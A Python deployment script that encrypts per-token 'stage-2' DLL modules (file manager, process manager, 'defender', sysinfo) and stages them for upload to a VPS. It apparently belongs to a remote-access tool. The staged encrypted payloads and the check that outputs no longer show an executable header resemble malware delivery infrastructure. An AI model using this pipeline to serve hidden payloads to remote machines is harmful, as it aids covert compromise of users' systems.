#!/usr/bin/env python3
"""
_deploy_stage2.py — encrypt stage-2 modules for ONE OR MORE room_tokens and
stage them under deploy/stage2/<token>/ ready to upload to the VPS.

Usage:
    python _deploy_stage2.py <token1> [<token2> ...]
    python _deploy_stage2.py --from-file tokens.txt
    python _deploy_stage2.py --from-config build/bin/host_config.json

Examples:
    # single token
    python _deploy_stage2.py ABC123

    # several tokens in one shot (all get the same module set)
    python _deploy_stage2.py ABC123 XYZ789 LMN456

    # from a file — one token per line, # comments allowed
    python _deploy_stage2.py --from-file tokens.txt

The output tree matches what server.py serves from STAGE2_DIR:

    deploy/stage2/<token1>/filemgr.bin
    deploy/stage2/<token1>/procmgr.bin
    deploy/stage2/<token1>/defender.bin
    deploy/stage2/<token2>/filemgr.bin
    ...

To deploy to your VPS (one rsync/scp does all tokens at once):
    scp -r deploy/stage2 root@<vps>:/opt/remotedesk/
"""
import argparse
import hashlib
import json
import os
import shutil
import subprocess
import sys
from pathlib import Path

HERE = Path(__file__).parent.resolve()
BUILD_STAGE2_DIR = HERE / "build" / "stage2"
DEPLOY_ROOT = HERE / "deploy" / "stage2"
GEN_SCRIPT = HERE / "_gen_stage2_blob.py"

# Modules produced by the build (name matches the CMake target name).
# Add new modules here as they get extracted.
MODULES = ["filemgr", "procmgr", "defender", "sysinfo"]


def load_token_from_config(path: Path) -> list[str]:
    if not path.is_file():
        sys.exit(f"ERROR: config file not found: {path}")
    data = json.loads(path.read_text(encoding="utf-8-sig"))
    token = str(data.get("room_token", "")).strip()
    if not token:
        sys.exit(f"ERROR: room_token empty in {path}")
    return [token]


def load_tokens_from_file(path: Path) -> list[str]:
    if not path.is_file():
        sys.exit(f"ERROR: tokens file not found: {path}")
    tokens = []
    for raw in path.read_text(encoding="utf-8-sig").splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        tokens.append(line)
    if not tokens:
        sys.exit(f"ERROR: no tokens found in {path} (one per line, # for comments)")
    return tokens


def bundle_one_token(token: str) -> tuple[Path, list]:
    """Encrypt all modules for a single token. Returns (out_dir, [(mod, size, sha)])."""
    out_dir = DEPLOY_ROOT / token
    if out_dir.exists():
        shutil.rmtree(out_dir)
    out_dir.mkdir(parents=True, exist_ok=True)

    encrypted = []
    for mod in MODULES:
        dll = BUILD_STAGE2_DIR / f"{mod}.dll"
        if not dll.is_file():
            print(f"  skip {mod}: {dll} not built")
            continue
        bin_out = out_dir / f"{mod}.bin"
        rc = subprocess.call([
            sys.executable, str(GEN_SCRIPT), token, str(dll), str(bin_out)
        ])
        if rc != 0:
            sys.exit(f"ERROR: encryption failed for {mod} / token {token[:8]}...")
        data = bin_out.read_bytes()
        if len(data) < 100 or data[:2] == b"MZ":
            sys.exit(f"ERROR: {bin_out} looks wrong (first 2 bytes or size)")
        sha = hashlib.sha256(data).hexdigest()[:12]
        encrypted.append((mod, len(data), sha))

    # Per-token README
    readme = out_dir / "README.txt"
    with readme.open("w", encoding="utf-8") as f:
        f.write(f"Stage-2 deployment bundle\n")
        if len(token) >= 16:
            f.write(f"Room token (first/last 8): {token[:8]}...{token[-8:]}\n")
        else:
            f.write(f"Room token: {token}  (len={len(token)})\n")
        f.write(f"Generated: {os.path.basename(str(HERE))} @ "
                f"{os.environ.get('COMPUTERNAME','')}\n\n")
        f.write(f"Modules:\n")
        for mod, sz, sha in encrypted:
            f.write(f"  {mod}.bin  {sz:>10,} bytes  sha256[0:12]={sha}\n")
    return out_dir, encrypted


def main() -> int:
    p = argparse.ArgumentParser(
        description="Encrypt stage-2 modules for one or more room tokens."
    )
    p.add_argument("tokens", nargs="*",
                   help="One or more room tokens (space-separated).")
    p.add_argument("--from-file",
                   help="Read tokens from a file, one per line (# = comment).")
    p.add_argument("--from-config",
                   help="Read the token from a host_config.json file.")
    args = p.parse_args()

    # Collect tokens from every provided source. De-duplicate while preserving order.
    tokens: list[str] = []
    seen: set[str] = set()
    for t in args.tokens:
        if t and t not in seen:
            tokens.append(t); seen.add(t)
    if args.from_file:
        for t in load_tokens_from_file(Path(args.from_file)):
            if t not in seen:
                tokens.append(t); seen.add(t)
    if args.from_config:
        for t in load_token_from_config(Path(args.from_config)):
            if t not in seen:
                tokens.append(t); seen.add(t)

    if not tokens:
        p.error("no tokens given (pass positional args, --from-file, or --from-config)")

    if not BUILD_STAGE2_DIR.is_dir():
        sys.exit(f"ERROR: {BUILD_STAGE2_DIR} does not exist — run the build first "
                 f"(cmake --build build).")

    print(f"Generating stage-2 bundles for {len(tokens)} token(s)...")

    results: list[tuple[str, Path, list]] = []
    for token in tokens:
        tag = token[:8] + ("..." + token[-4:] if len(token) > 12 else "")
        print(f"\n--- token: {tag}  (len={len(token)}) ---")
        out_dir, enc = bundle_one_token(token)
        results.append((token, out_dir, enc))

    # Summary
    print("\n" + "=" * 64)
    print("Deployment bundle ready:", DEPLOY_ROOT)
    print("=" * 64)
    for token, out_dir, enc in results:
        tag = token[:8] + ("..." + token[-4:] if len(token) > 12 else "")
        print(f"\n  {tag}/")
        for mod, sz, sha in enc:
            print(f"    {mod}.bin  {sz:>10,} bytes  sha256[0:12]={sha}")

    # Single upload line covers ALL tokens because they share DEPLOY_ROOT
    print(f"\nUpload ALL tokens in one shot:")
    print(f"  scp -r {DEPLOY_ROOT} root@<vps>:/opt/remotedesk/")
    print(f"\nOr via deploy_to_vps.ps1:")
    print(f"  .\\deploy_to_vps.ps1 -Vps root@<vps> -SkipBuild -SkipBlobs")
    print(f"  (blobs already generated — deploy script will pick them up from deploy/)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
